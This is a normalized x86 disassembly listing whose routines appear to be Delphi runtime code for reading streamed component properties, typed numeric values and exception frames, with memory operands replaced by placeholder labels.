call sub_41d648
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41d648
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dbac
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4052f0
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403418
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41a1f8
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41d594
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41a040
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41d594
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41a040
sub_41db38
push ebp
call sub_41d6b0
pop ecx
test al al
je r-xdata
call sub_4039d0
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_40321c
sub_41dbc0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41dc30
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41dc1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41dc30
mov eax [ ebp - 0x4 ]
call sub_41d180
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d2c4
retn
sub_41dc30
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d068
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e138
mov eax [ ebp - 0x4 ]
call sub_41dfd4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403418
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41dcf2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403418
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d068
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41d984
mov eax [ ebp - 0x4 ]
call sub_41dfd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dcf9
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41dd00
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41ee0c
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41df88
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41d3d0
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41dd44
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41ee0c
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41df88
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41d3d0
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41dd88
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41ee0c
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41df88
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41d3d0
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41ddd8
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41ee0c
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41df88
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41d3d0
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41de1c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41ee0c
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41cea8
mov al [ eax + lookup_table_41de43 ]
jmp [ eax * 4 + jump_table_41de51 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41d3d0
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_40405c
mov eax esi
call j_sub_404438#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41d3d0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fc0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fc0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fc0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fc0
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41df1c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41ee0c
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41d3d0
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41d3d0
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41d3d0
jmp r-xdata
jmp r-xdata
call sub_41cea8
sub_41df88
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41d3ac
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41df1c
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41ee0c
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41d3d0
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41dfdc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41d3ac
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41ee0c
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41df1c
mov [ edi ] eax
sub_41e01c
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41e10d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403f6c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_404004
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e114
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_40316c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041d0
sub_41e138
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e308
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_4037e8#5
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41ec30
xor edx edx
push ebp
push j_sub_4037e8#4
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_40422c
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_40448c
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40345c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_416638
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40345c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_416638
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41e4bc
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41d3bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41d3bc
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_4166e0
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41e11c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e30f
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov edi ebx
jmp r-xdata
sub_41e318
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_419b90
mov ebx eax
test ebx ebx
je r-xdata
call sub_41cea8
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_416754
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41e360
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c93c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_41a040
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41e3a0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41e3ef
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f524
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41723c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e3f6
lea eax [ ebp - 0x10 ]
call sub_40f188
retn
sub_41e3fc
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41e4ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41d3ac
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41de1c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c93c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_41a040
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ee0c
lea eax [ ebp - 0x4 ]
call sub_40599c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_417318
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e4b5
lea eax [ ebp - 0x8 ]
call sub_403f6c
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
sub_41e4bc
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e7b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e7be
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0x24 ]
call sub_404678
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f90
retn
jmp [ eax * 4 + jump_table_41e54c ]
mov eax [ rw-data ]
call sub_41ce90
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4166e0
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d3ac
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d46c
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416754
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41de1c
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_4165d4
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416754
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dd00
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416ff0
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41ec6c
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416cf0
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41ed28
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416e04
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41eb50
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416754
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d3ac
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d3ac
cmp al 0xd
jne r-xdata
push ebp
call sub_41e3a0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41df88
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4172dc
jmp r-xdata
push ebp
call sub_41e3fc
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4166e0
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41df1c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416754
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41de1c
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41e318
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ee0c
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416754
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41de1c
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ee0c
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41727c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ee0c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4166e0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41d4c4
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41727c
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41de1c
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41e360
pop ecx
jmp r-xdata
sub_41e7c4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403fc0
jmp r-xdata
mov eax [ ebx ]
call sub_419d28
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408f58
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e824
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41eb3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41ec0c
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41eb1d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41eade
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41ec30
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41ec30
mov eax [ ebp - 0x1c ]
call sub_4198fc
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41ec30
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41ec30
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41e7c4
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41ec30
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_403164
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41964c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41ea83
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_4060cc
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_41a040
xor eax eax
push ebp
push sub_41ea63
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_41a1f8
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ea6a
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_40321c
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_41a19c
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41eab4
call sub_40281c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a24
jmp r-xdata
call sub_4039d0
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41cbb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eb24
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41eae3
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41cd60
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_4039d0
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eb24
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_40321c
sub_41eb50
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ebfa
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41ebcd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41ee0c
cmp al 0xb
je r-xdata
mov eax ebx
call sub_4164a4
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41cea8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41cee0
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec01
lea eax [ ebp - 0x8 ]
